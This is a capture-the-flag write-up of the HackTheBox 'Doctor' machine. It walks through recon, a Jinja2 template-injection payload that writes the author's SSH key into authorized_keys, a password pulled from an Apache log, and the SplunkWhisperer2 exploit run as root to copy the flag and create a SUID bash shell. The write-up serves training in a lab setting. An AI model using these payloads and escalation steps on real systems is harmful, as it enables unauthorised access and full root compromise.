---
title: "Doctor : HTB writeup"
last_modified_at: 2021-02-13
categories:
  - HTB
author_profile: false
tags:
  - Linux Privilege Escalation
  - Splunkd
  - SSTI 
  - HTB
  - Writeup
---

![/assets/images/HTB/doctor_htb/Untitled.png](/assets/images/HTB/doctor_htb/Untitled.png)

# Nmap Scan

```bash
# nmap -A -sS -T4 -o nmap 10.10.10.209
# Nmap 7.80 scan initiated Sun Sep 27 02:53:02 2020 as: nmap -A -sS -T4 -o nmap 10.10.10.209
Nmap scan report for 10.10.10.209
Host is up (0.11s latency).
Not shown: 997 filtered ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache/2.4.41 (Ubuntu)
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Doctor
8089/tcp open  unknown
| ssl-cert: Subject: commonName=SplunkServerDefaultCert/organizationName=SplunkUser
| Not valid before: 2020-09-06T15:57:27
|_Not valid after:  2023-09-06T15:57:27
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: specialized|WAP|phone
Running: iPXE 1.X, Linux 2.4.X|2.6.X, Sony Ericsson embedded
OS CPE: cpe:/o:ipxe:ipxe:1.0.0%2b cpe:/o:linux:linux_kernel:2.4.20 cpe:/o:linux:linux_kernel:2.6.22 cpe:/h:sonyericsson:u8i_vivaz
OS details: iPXE 1.0.0+, Tomato 1.28 (Linux 2.4.20), Tomato firmware (Linux 2.6.22), Sony Ericsson U8i Vivaz mobile phone
Network Distance: 21 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   ... 20
21  101.64 ms 10.10.10.209

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Sep 27 02:53:57 2020 -- 1 IP address (1 host up) scanned in 55.67 seconds
```

Arguments

-A : OS detection , version detection, traceroute

-sS : TCP syn scan ( needs root privilege )

-T4 : Faster Scan

-o : Output the result to a file

Openssh 8.2p1 is not vulnerable to get access to the machine. Port 80 has a web server running Apache/2.4.41. Port 8089 has SSL certificate so we need to access via https.

# Port 80

![/assets/images/HTB/doctor_htb/Untitled%201.png](/assets/images/HTB/doctor_htb/Untitled%201.png)

![/assets/images/HTB/doctor_htb/Untitled%202.png](/assets/images/HTB/doctor_htb/Untitled%202.png)

Running gobuster for directory busting did not give any juicy information.

```bash
/images (Status: 301)
/blog.html (Status: 200)
/services.html (Status: 200)
/about.html (Status: 200)
/contact.html (Status: 200)
/index.html (Status: 200)
/css (Status: 301)
/js (Status: 301)
/departments.html (Status: 200)
/fonts (Status: 301)
```

But we can see the email `info@doctors.htb` which shows there could be a virtual host doctors.htb. 

Added `doctors.htb` in the /etc/hosts file

```bash
10.10.10.209 doctors.htb
```

On visiting doctors.htb we get

![/assets/images/HTB/doctor_htb/Untitled%203.png](/assets/images/HTB/doctor_htb/Untitled%203.png)

Register a new account

![/assets/images/HTB/doctor_htb/Untitled%204.png](/assets/images/HTB/doctor_htb/Untitled%204.png)

On logging in

![/assets/images/HTB/doctor_htb/Untitled%205.png](/assets/images/HTB/doctor_htb/Untitled%205.png)

We have the ability to create a New Message. The message shows in the screen.

![/assets/images/HTB/doctor_htb/Untitled%206.png](/assets/images/HTB/doctor_htb/Untitled%206.png)

Wappalyzer shows the app in built in flask and the top image shows the doctor has injection so there could be some kind of injection in this site. 

Tried different kinds of injection and found template injection was valid.

## Template Injection

Since jinja is quite famous with flask so I tried jinja template syntax.

Create a new message.

![/assets/images/HTB/doctor_htb/Untitled%207.png](/assets/images/HTB/doctor_htb/Untitled%207.png)

![/assets/images/HTB/doctor_htb/Untitled%208.png](/assets/images/HTB/doctor_htb/Untitled%208.png)

We can see there is no injection in this page. But if we look at the source code of the page.

![/assets/images/HTB/doctor_htb/Untitled%209.png](/assets/images/HTB/doctor_htb/Untitled%209.png)

We can see the comment stating there is a /archive route.

![/assets/images/HTB/doctor_htb/Untitled%2010.png](/assets/images/HTB/doctor_htb/Untitled%2010.png)

Nothing here. Let's check the source code as well

![/assets/images/HTB/doctor_htb/Untitled%2011.png](/assets/images/HTB/doctor_htb/Untitled%2011.png)

Which is the result of {{ 10+3 }}. The result is from the title of the message. So we need to inject the commands in the title of the message

## Payload

{{request.application.__**globals__**.__**builtins__**.__**import__**('os').popen('mkdir .ssh ;echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCVgRuVcFQAoPwF0JtBq1BGYvDD8h0Tt4fMKYUaFo6Q7wpqvlHKMLC8SR7ifOH8yvCfgRJGMrnl3Azj0GWGbSkdL9i8yv8Su+W/IKTkTTlc7jQQHCYBiyyw8TsK5QlJ1NbOWc+Eniu8OFPpTv6k4SMKVxdJSLbEzhxoWEvcJ4uDqfwcMKkDBjosF4moBsCM7hRa0eNffzHj4t+167cQ0Ip4A4Rl+4mfUdHUGaFxSQvqTfimDDotTyFZBcZM5wyNdz4ks5oSmIFrjr3P26n86CdWNUJEZTZ1J7WknF6u6DTrNGKAM5/iQBMk/S1O9Ru0Eqq20Tn8i4QzYfj5yTjH9h5yWOfIo4chOaygNNzGHDoHgqDOr9czLKSQyM4ojygJOe39scI89MoE9LN29o0WLhwLgxgrR0L+Ok099aIpzNsB3zf6hiZUd4h1za05GveL8BfgmbfFr7g9PqLg4AUubJVZnt/0V+eixFPHzUUrV3WgpZwBTqMOV1zrrGcr1b/UNi8= roshan@kali" > .ssh/authorized_keys').read()}}

What this does is

```bash
request.application
```

It is a function which is accesible with the request which is used.

```bash
request.application.__globals__
```

__globals__ is a dictionary assiciated with every function which is used to access the global variables.

```python
>>> def func():
...     global p
...     p = 18
... 
>>> func.__globals__
{'__name__': '__main__', '__doc__': None, '__package__': None, '__loader__': <class '_frozen_importlib.BuiltinImporter'>, '__spec__': None, '__annotations__': {}, '__builtins__': <module 'builtins' (built-in)>, 'a': <function a at 0x7f3e14adc1f0>, '__warningregistry__': {'version': 0}, 'func': <function func at 0x7f3e14adc160>, 'p': 18}
```

Here we can see __globals__ dictionary has __builtins__ key. It maps to builtins module. We can use this module to import functions that are done in the payload.

```bash
request.application.__globals__.__builtins__.__import__('os').popen(<payload>).read()
```

I used import function from builtins module to import os and then popen to execute commands and read to get the output

### Payload : How it works

First I used, pwd to get the current working directory which was /home/web and to get ssh access, the payload above is used. It first creates a **.ssh** directory inside /home/web and adds my public key in the **authorized_keys** file. The public key is from ~/.ssh/id_rsa . I used this so that I dont have to specify key. 

After posting the payload, we need to visit the /archive route for the payload to execute. After the execution, we can ssh into the machine

## SSH access to machine

```bash
$ ssh web@doctors.htb
Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-42-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

76 updates can be installed immediately.
36 of these updates are security updates.
To see these additional updates run: apt list --upgradable

The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Your Hardware Enablement Stack (HWE) is supported until April 2025.
Last login: Mon Jul 27 20:45:33 2020 from 192.168.127.142
web@doctor:~$
```

On enumerating we can see that there are three users with shell **web, shaun and splunk**. Splunk has description of Splunk Server, we will get to that in a bit. We are logged in as web. So we need horizontal escalation to get the user flag. Since web user does not have the user flag. Splunk has files of splunk forward server. So we need to get access to shaun.

We can see that the user belongs to **adm** group

```bash
web@doctor:~$ id
uid=1001(web) gid=1001(web) groups=1001(web),4(adm)
```

So we have access to logs. 

There is a backup file inside the apache2 log directory. This file is normally not found inside the logs.

```bash
web@doctor:/var/log/apache2$ ls
access.log        access.log.2.gz  access.log.7.gz  error.log.1      error.log.14.gz  error.log.6.gz
access.log.1      access.log.3.gz  access.log.8.gz  error.log.10.gz  error.log.2.gz   error.log.7.gz
access.log.10.gz  access.log.4.gz  access.log.9.gz  error.log.11.gz  error.log.3.gz   error.log.8.gz
access.log.11.gz  access.log.5.gz  **backup**           error.log.12.gz  error.log.4.gz   error.log.9.gz
access.log.12.gz  access.log.6.gz  error.log        error.log.13.gz  error.log.5.gz   other_vhosts_access.log
```

![/assets/images/HTB/doctor_htb/Untitled%2012.png](/assets/images/HTB/doctor_htb/Untitled%2012.png)

Let's check if there is some passwords in the backup log

```bash
web@doctor:/var/log/apache2$ cat backup | grep password
10.10.14.4 - - [05/Sep/2020:11:17:34 +2000] "POST /reset_password?email=Guitar123" 500 453 "http://doctor.htb/reset_password"
```

This took me a long time to understand that Guitar123 was a password to user shaun.

## Horizontal Escalation

Lets switch to shaun

```bash
web@doctor:/var/log/apache2$ su shaun
Password: 
shaun@doctor:/var/log/apache2$ cd ~/
shaun@doctor:~$ ls
user.txt
shaun@doctor:~$ cat user.txt 
8f52************************efb8
```

# Root

The box says that it has some CVE and we have not used the port 8089 ( which belongs to splunk server ) and the splunk user as well.

## Port 8089

![/assets/images/HTB/doctor_htb/Untitled%2013.png](/assets/images/HTB/doctor_htb/Untitled%2013.png)

On clicking on services, we are prompted with login screen. Since credentials reusing is normal so I tried the credentials

shaun : Guitar123

![/assets/images/HTB/doctor_htb/Untitled%2014.png](/assets/images/HTB/doctor_htb/Untitled%2014.png)

After logging in I could not find anything. So googling for vulnerabilities, I found [this](https://clement.notin.org/blog/2019/02/25/Splunk-Universal-Forwarder-Hijacking-2-SplunkWhisperer2/) which provides information on exploiting the splunkd running as root for privilege escalation. 

Then I checked if splunk is running as root

```bash
shaun@doctor:~$ ps -aux | grep splunk
root        1129  0.2  2.6 397056 108024 ?       Sl   06:56   1:54 splunkd -p 8089 start
root        1132  0.0  0.4  77664 16084 ?        Ss   06:56   0:00 [splunkd pid=1129] splunkd -p 8089 start [process-runner]
```

So the exploit could work. [Github link for exploit](https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2).

Downloaded PySplunkWhisperer2_remote.py on my local machine.

```bash
$ python PySplunkWhisperer2_remote.py 
usage: PySplunkWhisperer2_remote.py [-h] [--scheme SCHEME] --host HOST
                                    [--port PORT] --lhost LHOST
                                    [--lport LPORT] [--username USERNAME]
                                    [--password PASSWORD] [--payload PAYLOAD]
                                    [--payload-file PAYLOAD_FILE]
PySplunkWhisperer2_remote.py: error: argument --host is require`
```

So to get the root flag payload

```bash
$ python PySplunkWhisperer2_remote.py --host 10.10.10.209 --port 8089 --lhost 10.10.14.72 --username shaun --password Guitar123 --payload "cp /root/root.txt /tmp/check.txt;chmod +777 /tmp/check.txt" --payload-file exp.s
```

—host : Machine's IP

—port : Port which has splunk management server running

—lhost : My IP

—username : username to login to management web app

—password : user's password

—payload : payload to run

—payload-file: file name where payload is to be stored

### Payload

 `cp /root/root.txt /tmp/check.txt; chmod +777 /tmp/check.txt`

Copied the /root/root.txt to /tmp/check.txt . Since the permissions are not changed so the user cannot read the file so `chmod` is used to change the permission to get access to the file.

Get the flag

```bash
shaun@doctor:~$ cat /tmp/check.txt 
8f50************************26bc
```

If you want to get a root shell here is a payload

`cp /bin/bash /tmp/bash; chmod 4777 /tmp/bash`

This copies bash to tmp and adds the suid bit and permission to read, wirite as well as execute to all the users as a result, user can get shell as root.

```bash
shaun@doctor:/tmp$ ls -la bash
-rwsrwxrwx 1 root root 1183448 Sep 29 19:47 bash
shaun@doctor:/tmp$ ./bash -p
bash-5.0# whoami
root
bash-5.0#
```

-p is used so that bash uses euid as root user's id i.e 0. For more [info](https://unix.stackexchange.com/questions/74527/setuid-bit-seems-to-have-no-effect-on-bash).

## Things I learned

- Using framework does not assure that the application is secure.
- Take proper care when reflecting user inputs.
- Don't leave development endpoints public.
- Don't reuse same credentials.
- Don't run applications with root privilege, if the application is compromised, attackers can gain root privileges.